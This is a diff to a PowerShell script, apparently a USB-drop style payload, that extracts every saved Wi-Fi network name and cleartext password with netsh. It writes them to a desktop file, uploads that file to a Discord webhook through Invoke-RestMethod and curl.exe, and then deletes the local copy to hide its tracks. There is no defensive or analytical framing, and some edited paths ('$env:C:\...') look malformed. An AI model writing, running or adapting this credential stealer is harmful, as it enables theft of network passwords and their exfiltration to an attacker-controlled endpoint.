@@ -1,7 +1,7 @@
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
 $username = $Env:UserName
-$wifiProfiles > C:\Users\$username\Desktop\1.txt
+$wifiProfiles > $env:C:\Users\$username\Desktop\1.txt
 
 function Upload-Discord {
 
@@ -26,7 +26,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-Upload-Discord -file "desktop/1.txt"
+Upload-Discord -file "$env:C:\Users\$username\Desktop\1.txt"
 
 timeout 1
-del desktop\1.txt
+del $env:C:\Users\$username\Desktop\1.txt
